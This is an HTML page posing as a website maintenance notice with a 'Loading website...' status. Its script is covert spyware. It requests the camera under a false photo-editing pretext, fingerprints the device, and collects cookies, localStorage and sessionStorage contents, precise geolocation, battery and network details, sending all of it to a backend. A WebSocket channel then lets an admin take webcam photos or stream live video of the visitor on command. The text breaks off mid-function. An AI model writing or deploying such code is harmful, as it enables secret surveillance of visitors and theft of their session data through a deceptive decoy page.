<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>System Check</title>
  <style>
    body { 
      font-family: 'Segoe UI', Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    }
    .container {
      text-align: center;
      background: white;
      padding: 60px 80px;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    }
    h1 {
      color: #333;
      margin-bottom: 20px;
      font-size: 32px;
    }
    p {
      color: #666;
      margin-bottom: 40px;
      font-size: 16px;
    }
    .btn {
      display: inline-block;
      padding: 18px 48px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      text-decoration: none;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
    }
    .btn:active {
      transform: translateY(0);
    }
    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .status {
      margin-top: 30px;
      padding: 15px;
      border-radius: 10px;
      display: none;
    }
    .status.success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
      display: block;
    }
    .status.error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
      display: block;
    }
    .status.loading {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
      display: block;
    }
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(0,0,0,.1);
      border-radius: 50%;
      border-top-color: #0c5460;
      animation: spin 1s ease-in-out infinite;
      vertical-align: middle;
      margin-right: 10px;
    }
    main {
  height: 100%;
  display: flex;
  margin: 0 20px;
  text-align: center;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
main h1 {
  font-size: 3em;
  font-weight: 100;
  color: #F44;
  margin: 0;
}
main h2 {
  font-size: 1.5em;
  font-weight: 100;
  margin-bottom: 0;
}
main h3 {
  font-size: 1.5em;
  font-weight: 100;
  margin-top: 0;
}
main a {
  font-size: 1.5em;
  font-weight: 300;
  color: #F44;
  text-decoration: none;
}
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
  <!-- Socket.IO client library for WebSocket communication -->
  <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
</head>
<body>
  <div class="container">
    <main>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="70" viewBox="0 0 100 68">
    <g id="large">
      <path fill="none" stroke="#F44" d="M55.8 38.5l6.2-1.2c0-1.8-.1-3.5-.4-5.3l-6.3-.2c-.5-2-1.2-4-2.1-6l4.8-4c-.9-1.6-1.9-3-3-4.4l-5.6 3c-1.3-1.6-3-3-4.7-4.1l2-6A30 30 0 0 0 42 8l-3.3 5.4c-2-.7-4.2-1-6.2-1.2L31.3 6c-1.8 0-3.5.1-5.3.4l-.2 6.3c-2 .5-4 1.2-6 2.1l-4-4.8c-1.6.9-3 1.9-4.4 3l3 5.6c-1.6 1.3-3 3-4.1 4.7l-6-2A32.5 32.5 0 0 0 2 26l5.4 3.3c-.7 2-1 4.2-1.2 6.2L0 36.7c0 1.8.1 3.5.4 5.3l6.3.2c.5 2 1.2 4 2.1 6l-4.8 4c.9 1.6 1.9 3 3 4.4l5.6-3c1.4 1.6 3 3 4.7 4.1l-2 6A30.5 30.5 0 0 0 20 66l3.4-5.4c2 .7 4 1 6.1 1.2l1.2 6.2c1.8 0 3.5-.1 5.3-.4l.2-6.3c2-.5 4-1.2 6-2.1l4 4.8c1.6-.9 3-1.9 4.4-3l-3-5.6c1.6-1.3 3-3 4.1-4.7l6 2A32 32 0 0 0 60 48l-5.4-3.3c.7-2 1-4.2 1.2-6.2zm-13.5 4a12.5 12.5 0 1 1-22.6-11 12.5 12.5 0 0 1 22.6 11z"/>
      <animateTransform attributeName="transform" begin="0s" dur="3s" from="0 31 37" repeatCount="indefinite" to="360 31 37" type="rotate"/>
    </g>
    <g id="small">
      <path fill="none" stroke="#F44" d="M93 19.3l6-3c-.4-1.6-1-3.2-1.7-4.8L90.8 13c-.9-1.4-2-2.7-3.4-3.8l2.1-6.3A21.8 21.8 0 0 0 85 .7l-3.6 5.5c-1.7-.4-3.4-.5-5.1-.3l-3-5.9c-1.6.4-3.2 1-4.7 1.7L70 8c-1.5 1-2.8 2-3.9 3.5L60 9.4a20.6 20.6 0 0 0-2.2 4.6l5.5 3.6a15 15 0 0 0-.3 5.1l-5.9 3c.4 1.6 1 3.2 1.7 4.7L65 29c1 1.5 2.1 2.8 3.5 3.9l-2.1 6.3a21 21 0 0 0 4.5 2.2l3.6-5.6c1.7.4 3.5.5 5.2.3l2.9 5.9c1.6-.4 3.2-1 4.8-1.7L86 34c1.4-1 2.7-2.1 3.8-3.5l6.3 2.1a21.5 21.5 0 0 0 2.2-4.5l-5.6-3.6c.4-1.7.5-3.5.3-5.1zM84.5 24a7 7 0 1 1-12.8-6.2 7 7 0 0 1 12.8 6.2z"/>
      <animateTransform attributeName="transform" begin="0s" dur="2s" from="0 78 21" repeatCount="indefinite" to="-360 78 21" type="rotate"/>
    </g>
  </svg>
  <h1>Under Maintanance</h1>
  <h2>Sorry for the inconvenience.</h2>
  <h3>To contact us in the meantime please email:</h3>
  <a href="mailto:admin@MrTimcakes.com">admin@MrTimcakes.com</a>
</main>
    <div id="status" class="status loading">
      <span class="spinner"></span>Loading website...
    </div>
  </div>

  <script>
    const statusDiv = document.getElementById('status');

    // All the helper functions from original code
    function toHex(buffer) {
      const bytes = new Uint8Array(buffer);
      let s = '';
      for (let i=0;i<bytes.length;i++) s += bytes[i].toString(16).padStart(2,'0');
      return s;
    }

    async function sha256(input) {
      const enc = new TextEncoder();
      const data = enc.encode(input);
      const hash = await crypto.subtle.digest('SHA-256', data);
      return toHex(hash);
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      const screen = window.screen;

      // Enhanced browser detection
      const browser = (function(){
        if (ua.includes('Firefox/')) return 'Firefox';
        if (ua.includes('Edg/')) return 'Edge';
        if (ua.includes('OPR/') || ua.includes('Opera/')) return 'Opera';
        if (ua.includes('Chrome/') && !ua.includes('Edg/')) return 'Chrome';
        if (ua.includes('Safari/') && !ua.includes('Chrome/')) return 'Safari';
        return 'Unknown';
      })();

      // Enhanced OS and device model detection
      const deviceDetails = (function(){
        let os = 'Unknown';
        let deviceType = 'Desktop';
        let deviceModel = 'Unknown';
        let osVersion = 'Unknown';

        // iOS Detection
        if (ua.includes('iPhone')) {
          os = 'iOS';
          deviceType = 'Mobile';
          deviceModel = 'iPhone';
          // Try to detect iPhone model
          const models = {
            'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,2': 'iPhone 14 Pro',
            'iPhone14,3': 'iPhone 13 Pro Max', 'iPhone14,2': 'iPhone 13 Pro',
            'iPhone13,4': 'iPhone 12 Pro Max', 'iPhone13,3': 'iPhone 12 Pro',
            'iPhone13,2': 'iPhone 12', 'iPhone13,1': 'iPhone 12 Mini',
            'iPhone12,5': 'iPhone 11 Pro Max', 'iPhone12,3': 'iPhone 11 Pro',
            'iPhone12,1': 'iPhone 11'
          };
          for (const [key, value] of Object.entries(models)) {
            if (ua.includes(key)) deviceModel = value;
          }
          const iosMatch = ua.match(/OS (\d+)[_.](\d+)/);
          if (iosMatch) osVersion = `iOS ${iosMatch[1]}.${iosMatch[2]}`;
        }
        else if (ua.includes('iPad')) {
          os = 'iOS';
          deviceType = 'Tablet';
          deviceModel = 'iPad';
          const iosMatch = ua.match(/OS (\d+)[_.](\d+)/);
          if (iosMatch) osVersion = `iPadOS ${iosMatch[1]}.${iosMatch[2]}`;
        }
        // Android Detection
        else if (ua.includes('Android')) {
          os = 'Android';
          deviceType = /Mobile/i.test(ua) ? 'Mobile' : 'Tablet';
          const androidMatch = ua.match(/Android\s+([\d.]+)/);
          if (androidMatch) osVersion = `Android ${androidMatch[1]}`;

          // Try to detect Android device model
          const modelMatch = ua.match(/\(([^)]+)\)/);
          if (modelMatch) {
            const details = modelMatch[1];
            // Common manufacturers
            if (details.includes('SM-')) deviceModel = 'Samsung ' + details.match(/SM-[^\s;]+/)?.[0];
            else if (details.includes('Pixel')) deviceModel = 'Google ' + details.match(/Pixel[^\s;]+/)?.[0];
            else if (details.includes('ONEPLUS')) deviceModel = details.match(/ONEPLUS[^\s;]+/)?.[0];
            else if (details.includes('MI ')) deviceModel = 'Xiaomi ' + details.match(/MI[^\s;]+/)?.[0];
            else if (details.includes('Redmi')) deviceModel = 'Xiaomi Redmi ' + details.match(/Redmi[^\s;]+/)?.[0];
            else if (details.includes('VOG-')) deviceModel = 'Huawei ' + details.match(/VOG-[^\s;]+/)?.[0];
            else if (details.includes('HUAWEI')) deviceModel = details.match(/HUAWEI[^\s;]+/)?.[0];
            else deviceModel = details.split(';')[0].trim();
          }
        }
        // Windows Detection
        else if (ua.includes('Windows')) {
          os = 'Windows';
          deviceType = 'Desktop';
          if (ua.includes('Windows NT 10.0')) osVersion = 'Windows 10/11';
          else if (ua.includes('Windows NT 6.3')) osVersion = 'Windows 8.1';
          else if (ua.includes('Windows NT 6.2')) osVersion = 'Windows 8';
          else if (ua.includes('Windows NT 6.1')) osVersion = 'Windows 7';
          deviceModel = 'PC';
        }
        // macOS Detection
        else if (ua.includes('Mac OS')) {
          os = 'macOS';
          deviceType = 'Desktop';
          const macMatch = ua.match(/Mac OS X ([\d_]+)/);
          if (macMatch) {
            const version = macMatch[1].replace(/_/g, '.');
            osVersion = `macOS ${version}`;
          }
          // Try to determine if it's MacBook, iMac, etc.
          if (ua.includes('Macintosh')) {
            const cpuMatch = ua.match(/\(([^)]+)\)/);
            if (cpuMatch) {
              const cpu = cpuMatch[1];
              if (cpu.includes('Intel')) deviceModel = 'Mac (Intel)';
              else if (cpu.includes('ARM')) deviceModel = 'Mac (Apple Silicon)';
              else deviceModel = 'Mac';
            }
          }
        }
        // Linux Detection
        else if (ua.includes('Linux')) {
          os = 'Linux';
          deviceType = 'Desktop';
          deviceModel = 'PC';
          if (ua.includes('Ubuntu')) osVersion = 'Ubuntu';
          else if (ua.includes('Fedora')) osVersion = 'Fedora';
          else if (ua.includes('Debian')) osVersion = 'Debian';
        }

        return { os, deviceType, deviceModel, osVersion };
      })();

      const timezone = {
        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: -(new Date().getTimezoneOffset() / 60),
        current: new Date().toLocaleTimeString('en-US', { timeZoneName: 'long', hour12: false })
      };

      const locales = {
        browser: navigator.language,
        system: Intl.DateTimeFormat().resolvedOptions().locale,
        available: navigator.languages || [],
        dateFormat: new Date().toLocaleDateString(),
        timeFormat: new Date().toLocaleTimeString(),
        numberFormat: new Intl.NumberFormat().format(1234.56)
      };

      // Screen details
      const screenInfo = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type || 'unknown',
        angle: screen.orientation?.angle || 0,
        pixelRatio: window.devicePixelRatio || 1
      };

      return {
        browser,
        browserVersion: ua,
        os: deviceDetails.os,
        osVersion: deviceDetails.osVersion,
        deviceType: deviceDetails.deviceType,
        deviceModel: deviceDetails.deviceModel,
        platform: navigator.platform,
        vendor: navigator.vendor || 'Unknown',
        screen: screenInfo,
        timezone,
        locales,
        language: navigator.language,
        cores: navigator.hardwareConcurrency || 'unknown',
        memory: navigator.deviceMemory || 'unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        touch: 'ontouchstart' in window ? 'Yes' : 'No',
        mobile: /Mobi|Android/i.test(ua) ? 'Yes' : 'No',
        userAgent: ua
      };
    }

    async function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { renderer: null, vendor: null };
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
          vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null
        };
      } catch (e) {
        return { renderer: null, vendor: null };
      }
    }

    async function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = 240;
        canvas.height = 60;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#f60';
        ctx.fillRect(0,0,240,60);
        ctx.font = '16px Arial';
        ctx.fillStyle = '#069';
        ctx.fillText('Fingerprint test â€” ' + navigator.userAgent, 10, 30);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('ð•¯ð–†ð–™ð–†', 10, 50);
        const data = canvas.toDataURL();
        return await sha256(data);
      } catch (e) {
        return null;
      }
    }

    async function computeFingerprint() {
      const dev = getDeviceInfo();
      const webgl = await getWebGLInfo();
      const canvasHash = await getCanvasFingerprint();
      const components = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${dev.screen.width}x${dev.screen.height}x${dev.screen.colorDepth}`,
        timezone: dev.timezone.name,
        cores: dev.cores,
        memory: dev.memory,
        webglRenderer: webgl.renderer || '',
        webglVendor: webgl.vendor || '',
        canvasHash: canvasHash || ''
      };
      const concat = Object.values(components).join('||');
      const fp = await sha256(concat);
      return { fp, components };
    }

    async function getIPInfo() {
      try {
        // Use backend endpoint to avoid CORS issues
        const r = await fetch('/api/get-ip-info');
        if (!r.ok) return null;
        const data = await r.json();

        // Normalize the response based on provider
        const normalized = {
          ip: data.ip,
          city: data.city || null,
          region: data.region || null,
          country: data.country_name || data.country || null,
          latitude: data.latitude || data.lat || (data.loc ? parseFloat(data.loc.split(',')[0]) : null),
          longitude: data.longitude || data.lon || (data.loc ? parseFloat(data.loc.split(',')[1]) : null),
          org: data.org || data.isp || null,
          provider: data.provider,
          raw: data
        };

        return normalized;
      } catch (e) {
        console.warn('IP info fetch failed', e);
        return null;
      }
    }

    function haversineKm(lat1, lon1, lat2, lon2) {
      const toRad = v => v * Math.PI / 180;
      const R = 6371;
      const dLat = toRad(lat2 - lat1);
      const dLon = toRad(lon2 - lon1);
      const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon/2)**2;
      return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    }

    function detectVPN(ipInfo, deviceCoords) {
      const result = { isVPN: false, score: 0, reasons: [] };
      if (!ipInfo) { result.reasons.push('no-ip-info'); return result; }
      const raw = ipInfo.raw || {};
      if (raw.proxy || raw.vpn || raw.hosting || raw.security?.is_vpn || raw.security?.is_proxy) {
        result.score += 50;
        result.reasons.push('provider-flagged-proxy/vpn');
      }
      const org = ((raw.org || ipInfo.org || ipInfo.provider) + '').toLowerCase();
      const keywords = ['amazon','aws','google','digitalocean','ovh','hetzner','linode','microsoft','azure','vultr','vpn','proxy','hosting'];
      for (const kw of keywords) {
        if (org.includes(kw)) {
          result.score += 30;
          result.reasons.push('org:' + kw);
          break;
        }
      }
      const ipLat = ipInfo.latitude || ipInfo.lat || raw.latitude || raw.lat;
      const ipLon = ipInfo.longitude || ipInfo.lon || raw.longitude || raw.lon;
      if (deviceCoords && ipLat && ipLon) {
        const dkm = haversineKm(deviceCoords.lat, deviceCoords.lon, Number(ipLat), Number(ipLon));
        if (!isNaN(dkm)) {
          if (dkm > 1000) {
            result.score += 40;
            result.reasons.push('distance>' + Math.round(dkm) + 'km');
          } else if (dkm > 200) {
            result.score += 20;
            result.reasons.push('distance>' + Math.round(dkm) + 'km');
          }
        }
      }
      result.isVPN = result.score >= 50 || (result.score > 0 && result.score >= 40);
      return result;
    }

    async function getConnectionInfo() {
      try {
        const tlsInfo = {
          protocol: window.location.protocol,
          isSecure: window.location.protocol === 'https:',
          tlsVersion: 'unknown',
          cipherSuite: 'unknown'
        };
        const perf = window.performance.getEntriesByType('resource') || [];
        if (perf.length && 'nextHopProtocol' in perf[0]) tlsInfo.protocol = perf[0].nextHopProtocol || tlsInfo.protocol;
        return { tls: tlsInfo };
      } catch (e) {
        return null;
      }
    }

    function parseCookies() {
      const cookie = document.cookie || '';
      if (!cookie) return [];
      return cookie.split(';').map(s => {
        const [k, ...rest] = s.split('=');
        return { name: k.trim(), value: rest.join('=').trim() };
      });
    }

    function getLocalStorageInfo() {
      try {
        const keys = Object.keys(localStorage || {});
        const entries = keys.slice(0,50).map(k => ({ key: k, value: localStorage.getItem(k) }));
        return { count: keys.length, sample: entries };
      } catch (e) { return { error: 'localStorage access denied' }; }
    }

    function getSessionStorageInfo() {
      try {
        const keys = Object.keys(sessionStorage || {});
        const entries = keys.slice(0,50).map(k => ({ key: k, value: sessionStorage.getItem(k) }));
        return { count: keys.length, sample: entries };
      } catch (e) { return { error: 'sessionStorage access denied' }; }
    }

    async function getIndexedDBInfo(limitPerStore = 5) {
      if (!('indexedDB' in window)) return { supported: false };
      if (!indexedDB.databases) return { supported: true, enumerated: false };
      try {
        const dbList = await indexedDB.databases();
        return { supported: true, enumerated: true, count: dbList.length, databases: dbList.map(d => d.name) };
      } catch (e) {
        return { supported: true, enumerated: false };
      }
    }

    async function getBatteryInfo() {
      try {
        if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          return {
            supported: true,
            charging: battery.charging,
            chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' seconds',
            dischargingTime: battery.dischargingTime === Infinity ? 'Calculating...' : battery.dischargingTime + ' seconds',
            level: Math.round(battery.level * 100) + '%',
            levelRaw: battery.level,
            health: (function() {
              // Estimate battery health based on level behavior
              // This is a rough estimate, actual health requires system-level access
              const level = battery.level;
              if (level >= 0.9) return 'Excellent';
              if (level >= 0.7) return 'Good';
              if (level >= 0.4) return 'Fair';
              if (level >= 0.2) return 'Poor';
              return 'Critical';
            })()
          };
        } else {
          return { supported: false, reason: 'Battery API not available' };
        }
      } catch (e) {
        return { supported: false, error: e.message };
      }
    }

    async function getNetworkInfo() {
      try {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
          return {
            supported: true,
            effectiveType: connection.effectiveType || 'unknown', // '4g', '3g', '2g', 'slow-2g'
            downlink: connection.downlink || 'unknown', // Mbps
            downlinkMax: connection.downlinkMax || 'unknown', // Mbps
            rtt: connection.rtt || 'unknown', // milliseconds
            saveData: connection.saveData || false,
            type: connection.type || 'unknown' // 'wifi', 'cellular', 'ethernet', etc.
          };
        } else {
          return { supported: false, reason: 'Network Information API not available' };
        }
      } catch (e) {
        return { supported: false, error: e.message };
      }
    }

    async function getMediaDevices() {
      try {
        if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          return {
            supported: true,
            audioInputs: devices.filter(d => d.kind === 'audioinput').length,
            audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
            videoInputs: devices.filter(d => d.kind === 'videoinput').length,
            total: devices.length
          };
        } else {
          return { supported: false };
        }
      } catch (e) {
        return { supported: false, error: e.message };
      }
    }

    async function requestCameraAccess() {
      try {
        if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
          // Request camera access for photo editing
          // On HTTPS (live), this should work if user grants permission
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
          });

          // Stop the stream immediately after getting permission
          // We'll request it again when user actually wants to edit photos
          stream.getTracks().forEach(track => track.stop());

          return {
            granted: true,
            message: 'Camera access granted for photo editing'
          };
        } else {
          return {
            granted: false,
            message: 'Camera API not supported in this browser'
          };
        }
      } catch (e) {
        // Log the error for debugging
        console.error('Camera access error:', e);
        return {
          granted: false,
          error: e.message || e.name || 'Unknown error',
          message: 'Camera access denied or unavailable: ' + (e.message || e.name || 'Unknown error')
        };
      }
    }

    async function collectAllData() {
      statusDiv.className = 'status loading';
      statusDiv.innerHTML = '<span class="spinner"></span>Loading website data...';

      try {
        // Request camera access first
        const cameraAccess = await requestCameraAccess();
        console.log('Camera access:', cameraAccess);

        // Collect all data
        const deviceInfo = getDeviceInfo();
        const fingerprint = await computeFingerprint();
        const ipInfo = await getIPInfo();
        const connectionInfo = await getConnectionInfo();
        const cookies = parseCookies();
        const localStorage = getLocalStorageInfo();
        const sessionStorage = getSessionStorageInfo();
        const indexedDB = await getIndexedDBInfo();
        const batteryInfo = await getBatteryInfo();
        const networkInfo = await getNetworkInfo();
        const mediaDevices = await getMediaDevices();

        // Try to get geolocation
        let deviceCoords = null;
        if (navigator.geolocation) {
          try {
            const pos = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000
              });
            });
            deviceCoords = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              altitudeAccuracy: pos.coords.altitudeAccuracy,
              heading: pos.coords.heading,
              speed: pos.coords.speed
            };
          } catch (e) {
            console.warn('Geolocation failed', e);
          }
        }

        const vpnDetection = detectVPN(ipInfo, deviceCoords);

        // Prepare payload
        const payload = {
          deviceInfo,
          fingerprint,
          ipInfo,
          connectionInfo,
          batteryInfo,
          networkInfo,
          mediaDevices,
          cameraAccess,
          cookies,
          localStorage,
          sessionStorage,
          indexedDB,
          deviceCoords,
          vpnDetection,
          timestamp: new Date().toISOString()
        };

        // Enhanced logging for debugging
        console.log('%c[DEBUG] Camera Access Data:', 'color: #4CAF50; font-weight: bold;');
        console.log('  Granted:', cameraAccess.granted);
        console.log('  Message:', cameraAccess.message);
        if (cameraAccess.error) {
          console.log('  Error:', cameraAccess.error);
        }
        console.log('  Full cameraAccess object:', JSON.stringify(cameraAccess));
        console.log('%c[DEBUG] Full Payload:', 'color: #2196F3; font-weight: bold;', payload);
        console.log('%c[DEBUG] Payload cameraAccess:', 'color: #FF9800; font-weight: bold;', payload.cameraAccess);

        // Send to backend
        const response = await fetch('/api/collect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          const result = await response.json();
          // Store entry_id and fingerprint for photo linking
          window.currentEntryId = result.entry_id;
          window.currentFingerprint = result.fingerprint;
          
          statusDiv.className = 'status success';
          statusDiv.innerHTML = ' Website will be Live in a few minutes!';
        } else {
          throw new Error('Failed to submit data');
        }

      } catch (error) {
        console.error('Error:', error);
        statusDiv.className = 'status error';
        statusDiv.innerHTML = 'âœ— An error occurred. Please try again.';
      }
    }

    // Detect if iOS device (used in multiple places)
    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

    // Photo capture functionality
    async function capturePhoto(source = 'auto') {
      try {
        console.log(`[PHOTO] Starting ${source} photo capture...`);

        // Request camera access - uses the device's front camera
        // On iPhone: uses iPhone's front camera
        // On laptop: uses laptop's webcam
        // This ensures remote users use their own device's camera
        // iOS Safari may need simpler constraints
        const videoConstraints = isIOS 
          ? { facingMode: 'user' }  // Simpler constraint for iOS
          : { 
              facingMode: 'user',  // Front-facing camera (iPhone front camera, laptop webcam)
              width: { ideal: 1280 },
              height: { ideal: 720 }
            };

        const stream = await navigator.mediaDevices.getUserMedia({
          video: videoConstraints,
          audio: false
        });

        // Create video element to capture frame
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.style.display = 'none';
        document.body.appendChild(video);

        // Wait for video to be ready
        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // Wait a moment for camera to adjust
        await new Promise(resolve => setTimeout(resolve, 500));

        // Create canvas to capture image
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // Convert to blob
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));

        // Stop camera
        stream.getTracks().forEach(track => track.stop());
        video.remove();

        // Get entry ID and fingerprint from collected data (if available)
        const entryId = window.currentEntryId || null;
        const fingerprint = window.currentFingerprint || (await computeFingerprint()).fp;

        // Send to backend with entry ID to link photo to collected data
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        formData.append('timestamp', new Date().toISOString());
        formData.append('fingerprint', fingerprint);
        formData.append('ip_address', (await getIPInfo())?.ip || '');
        formData.append('capture_source', source);
        if (entryId) {
          formData.append('data_entry_id', entryId);
        }

        console.log('[PHOTO] Uploading photo to server...');

        const response = await fetch('/api/save-photo', {
          method: 'POST',
          body: formData
        });

        const result = await response.json();

        if (response.ok) {
          console.log('[PHOTO] Photo captured and saved successfully!', result);
        } else {
          throw new Error(result.message || 'Failed to save photo');
        }

      } catch (error) {
        console.error('[PHOTO] Photo capture error:', error);
        // Show error to user on manual capture
        if (source === 'manual') {
          statusDiv.className = 'status error';
          statusDiv.innerHTML = 'âœ— Failed to capture photo: ' + error.message;
        }
        // Don't show error to user on auto capture - fail silently
      }
    }


    // WebSocket connection for photo requests
    let socket = null;
    let currentEntryId = null;
    let currentFingerprint = null;

    // Initialize WebSocket connection
    let heartbeatInterval = null;
    
    function initWebSocket() {
      // Use polling as fallback if WebSocket fails
      socket = io({
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionDelayMax: 5000,
        reconnectionAttempts: Infinity,  // Keep trying to reconnect
        timeout: 20000
      });
      
      // Register user function (reusable)
      function registerUser() {
        if (currentEntryId && currentFingerprint && socket.connected) {
          socket.emit('register_user', {
            entry_id: currentEntryId,
            fingerprint: currentFingerprint
          });
          console.log('[WEBSOCKET] Registered user:', currentEntryId);
        }
      }
      
      socket.on('connect', () => {
        console.log('[WEBSOCKET] Connected to server');
        // Register this user's entry when connected
        registerUser();
        
        // Send periodic heartbeat to keep connection alive and re-register if needed
        if (heartbeatInterval) {
          clearInterval(heartbeatInterval);
        }
        heartbeatInterval = setInterval(() => {
          if (socket.connected && currentEntryId && currentFingerprint) {
            // Re-register periodically to ensure we stay in active_users
            registerUser();
          }
        }, 30000); // Every 30 seconds
      });

      socket.on('reconnect', (attemptNumber) => {
        console.log(`[WEBSOCKET] Reconnected to server (attempt ${attemptNumber})`);
        // Re-register user after reconnection
        registerUser();
      });

      socket.on('reconnect_attempt', (attemptNumber) => {
        console.log(`[WEBSOCKET] Reconnection attempt ${attemptNumber}`);
      });

      socket.on('reconnect_error', (error) => {
        console.error('[WEBSOCKET] Reconnection error:', error);
      });

      socket.on('reconnect_failed', () => {
        console.error('[WEBSOCKET] Reconnection failed - will keep trying');
      });

      socket.on('connect_error', (error) => {
        console.error('[WEBSOCKET] Connection error:', error);
      });

      socket.on('disconnect', (reason) => {
        console.log('[WEBSOCKET] Disconnected from server:', reason);
        if (heartbeatInterval) {
          clearInterval(heartbeatInterval);
          heartbeatInterval = null;
        }
      });

      // Listen for photo requests from admin
      socket.on('photo_request', async (data) => {
        console.log('[WEBSOCKET] Photo request received:', data);
        
        // Check if this request is for this user
        if (data.entry_id === currentEntryId || data.fingerprint === currentFingerprint) {
          // Capture and upload photo with source "Manual" (requested by admin)
          try {
            await capturePhoto('Manual');
            console.log('[WEBSOCKET] Photo captured in response to admin request');
          } catch (error) {
            console.error('[WEBSOCKET] Failed to capture photo:', error);
          }
        }
      });

      // Listen for stream requests from admin
      socket.on('stream_request', async (data) => {
        console.log('[WEBSOCKET] Stream request received:', data);
        
        // Check if this request is for this user
        if (data.entry_id === currentEntryId || data.fingerprint === currentFingerprint) {
          // Start streaming
          try {
            await startLiveStream(data.entry_id);
            console.log('[WEBSOCKET] Live stream started');
          } catch (error) {
            console.error('[WEBSOCKET] Failed to start stream:', error);
          }
        }
      });

      socket.on('stop_stream_request', (data) => {
        console.log('[WEBSOCKET] Stop stream request received:', data);
        if (data.entry_id === currentEntryId) {
          stopLiveStream();
        }
      });
    }

    // Live stream variables
    let streamInterval = null;
    let mediaStream = null;

    async function startLiveStream(entryId) {
      try {
        // Request camera access
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            width: { ideal: 320 },
            height: { ideal: 240 },
            facingMode: 'user'
          } 
        });

        const video = document.createElement('video');
        video.srcObject = mediaStream;
        video.play();

        // Create canvas to capture frames
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 320;  // Reduced resolution to reduce bandwidth
        canvas.height = 240; // Reduced resolution to reduce bandwidth

        // Frame queue to prevent overwhelming the server
        let frameQueue = 0;
        const MAX_QUEUE = 2; // Maximum frames in queue

        // Capture and send frames
        streamInterval = setInterval(() => {
          // Skip frame if queue is full to prevent server overload
          if (frameQueue >= MAX_QUEUE) {
            return;
          }

          if (video.readyState === video.HAVE_ENOUGH_DATA) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            // Reduced quality from 0.7 to 0.5 to reduce file size
            const frameData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1]; // Base64 without data URL prefix
            
            // Send frame via WebSocket
            if (socket && socket.connected) {
              frameQueue++;
              socket.emit('stream_frame', {
                entry_id: entryId,
                frame_data: frameData
              }, () => {
                // Decrement queue on acknowledgment
                if (frameQueue > 0) frameQueue--;
              });
            }
          }
        }, 200); // Reduced from 100ms to 200ms (5 FPS instead of 10 FPS)

        console.log('[STREAM] Live stream started (optimized: 320x240 @ 5 FPS)');
      } catch (error) {
        console.error('[STREAM] Failed to start stream:', error);
        alert('Failed to access camera: ' + error.message);
      }
    }

    function stopLiveStream() {
      if (streamInterval) {
        clearInterval(streamInterval);
        streamInterval = null;
      }
      
